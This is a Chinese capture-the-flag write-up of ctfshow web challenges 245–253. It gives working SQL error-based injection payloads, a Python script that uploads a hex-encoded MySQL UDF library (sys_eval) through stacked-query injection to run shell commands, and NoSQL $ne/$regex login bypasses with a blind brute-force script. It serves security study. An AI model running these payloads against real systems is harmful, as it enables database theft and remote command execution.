' or extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1))%23

' or extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),1))%23

' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),1,30),1))%23
# ctfshow{4b5b35b0-c9e4-4fc1-92a
' or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))%23
# e4-4fc1-92a7-f9fdf4027c96}
```

## 246_报错注入-floor双查询注入

过滤了updatexml和extractvalu，再换一个姿势：floor双查询报错
参考文章：[sql注入之双查询注入 - 简书 (jianshu.com)](https://www.jianshu.com/p/e097a1c0d9ef)

> ```mysql
> 固定套路：
> select count(*),concat_ws(':',([子查询],floor(rand()*2))) as a form [table_name] group by a;
> ```
> > floor报错注入的深层次原因：
> > 通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。




```
' union select 1,count(*),concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1,floor(rand(0)*2))b from information_schema.tables group by b%23

' union select 1,count(*),concat(1,(select column_name from information_schema.columns where table_name='ctfshow_flags' limit 1,1),1,floor(rand(0)*2))b from information_schema.tables group by b%23

' union select 1,count(*),concat(1,(select flag2 from ctfshow_flags),1,floor(rand(0)*2))b from information_schema.tables group by b%23
```

## 247_报错注入-floor双查询注入

把floor过滤了，因为`rand()*2`大概是0-2，可以改用ceil()：向上取整；或者是round()：四舍五入

```
' union select 1,count(*),concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1,ceil(rand(0)*2))b from information_schema.tables group by b%23

' union select 1,count(*),concat(1,(select column_name from information_schema.columns where table_name='ctfshow_flagsa' limit 1,1),1,ceil(rand(0)*2))b from information_schema.tables group by b%23

' union select 1,count(*),concat(1,(select `flag?` from ctfshow_flagsa),1,ceil(rand(0)*2))b from information_schema.tables group by b%23
```

要注意这里的列名是flag?，？会报错，用反引号包起来就好

## 248_UDF注入

> UDF (user defined function)：用户自定义函数。
> 通过添加新函数，对MySQL的功能进行扩充， 就像使用本地MySQL函数如 user() 或 concat() 等

```mysql
create function $function_name returns string soname '$shared_library_name';
# 这里要传入的函数是sys_eval；共享包名未udf.dll
```

简单来说就是把dll文件写到目标机子的plugin目录，并且创建函数

而写入文件需要查看secure_file_priv的值确定写入权限，还有要知道plugin的目录
可以通过`select @@plugin_dir,@@secure_file_priv;` 来查看； 其他一些配置参数也可以利用@@注出来

具体的udf注入可以学习一下这个师傅的文章[一道CTF题目引发的Mysql的udf学习_river-CSDN博客](https://blog.csdn.net/qq_20307987/article/details/88824432)

用一下翅膀大师傅的exp：

```python
import requests

base_url="http://6784eea0-2740-42d3-8a58-117a03308908.challenge.ctf.show:8080/api/"
payload = []
text = ["a", "b", "c", "d", "e"]
udf = "7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"
for i in range(0,21510, 5000):
    end = i + 5000
    payload.append(udf[i:end])

p = dict(zip(text, payload))

for t in text:
    url = base_url+"?id=';select unhex('{}') into dumpfile '/usr/lib/mariadb/plugin/{}.txt'--+&page=1&limit=10".format(p[t], t)
    r = requests.get(url)
    print(r.status_code)

next_url = base_url+"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'--+&page=1&limit=10"
rn = requests.get(next_url)

uaf_url=base_url+"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"#导入udf函数
r=requests.get(uaf_url)
nn_url = base_url+"?id=';select sys_eval('cat /flag.*');--+&page=1&limit=10"
rnn = requests.get(nn_url)
print(rnn.text)


```

## 249_nosql

第一次接触nosql，学习文章：
[冷门知识 — NoSQL注入知多少 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/97211)
[NoSQL注入小笔记 - Ruilin (rui0.cn)](http://rui0.cn/archives/609)

> ```mariadb
> # MongoDB条件操作符：
> $gt : >
> $lt : <
> $gte: >=
> $lte: <=
> $ne : !=、<>
> $in : in
> $nin: not in
> $all: all 
> $or:or
> $not: 反匹配(1.3.3及以上版本)
> 模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
> /**
> * : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
> * : $ne { "age" : { "$ne" : 23}}
> * : $lt { "age" : { "$lt" : 23}}
> */
> ```
>
> 

> ```php
> $user = $memcache->get($id);
> ```

然后本题也提示了flag在flag中，这里看Y4师傅说过滤的非数字，猜测后端用的是intval(),数组绕过即可：

```
?id[]=flag
```

## 250_nosql

> ```php
> // sql语句
> 
>   $query = new MongoDB\Driver\Query($data);
>   $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
>       
> // 返回逻辑
> 
>   //无过滤
>   if(count($cursor)>0){
>     $ret['msg']='登陆成功';
>     array_push($ret['data'], $flag);
>   }
> ```

构造 `$data = array("username" => array("\$ne" => 1), "password" => array("\$ne" => 1));` 

```
// $ne : !=、<>
username[$ne]=1&password[$ne]=1
// 也可以正则
username[$regex]=.*&password[$regex]=.*
```

## 251_nosql

> ```php
> sql语句
> 
>   $query = new MongoDB\Driver\Query($data);
>   $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
>       
> 返回逻辑
> 
>   //无过滤
>   if(count($cursor)>0){
>     $ret['msg']='登陆成功';
>     array_push($ret['data'], $flag);
>   }
> ```
>
> 

用上题的payload会返回admin的账户密码，照着登录就行，只改用户名也可以，不过不懂为啥
应该是表里存在两条数据，一组是admin，一组是flag？

```
username[$ne]=1&password[$ne]=1
username[$ne]=admin&password[$ne]=1
username[$ne]=admin&password[$ne]=ctfshow666nnneeaaabbbcc
```

## 252_nosql

> ```php
>   //sql
>   db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
>   
>   //无过滤
>   if(count($cursor)>0){
>     $ret['msg']='登陆成功';
>     array_push($ret['data'], $flag);
>   }
> ```
>
> sql语句是在数据库中找username和password，而mongodb的find().pretty()是使得查询出来的结果更美观

```
username[$ne]=1&password[$ne]=1		# 得到admin
username[$ne]=admin&password[$ne]=1		# 得到admin1
```

比上题多加了一组admin1的数据，直接输入账户密码登录即可

也可以正则，不过username的名字是f_l_a_g，尝试正则的话得多试错

```
username[$regex]=^[^a].*$&password[$ne]=1
```

## 253_nosql

> ```php
>   //sql
>   db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
> 
>   //无过滤
>   if(count($cursor)>0){
>     $ret['msg']='登陆成功';
>     array_push($ret['data'], $flag);
>   }
>       
> ```
>
> 无回显，考基础的盲注

不过我不懂username是啥呀，看师傅们说猜测是flag，那么password就可以利用正则匹配诸位flag
写脚本跑一下：

```python
import requests

url = 'http://d3980fec-40a4-4ca6-9601-6e65b769d041.challenge.ctf.show:8080/api/'
flag = "ctfshow{"
strs = "0123456789{}-abcdefghijklmnopqrstuvwxyz"

for i in range(8, 50):
    for j in strs:
        data = {
            "username[$regex]": 'flag',
            'password[$regex]': "^{}.*$".format(flag + j)
        }
        r = requests.post(url, data=data)
        if r'\u767b\u9646\u6210\u529f' in r.text:
            flag += j
            print(flag)
            if "}" in flag:
                exit()
            break
```

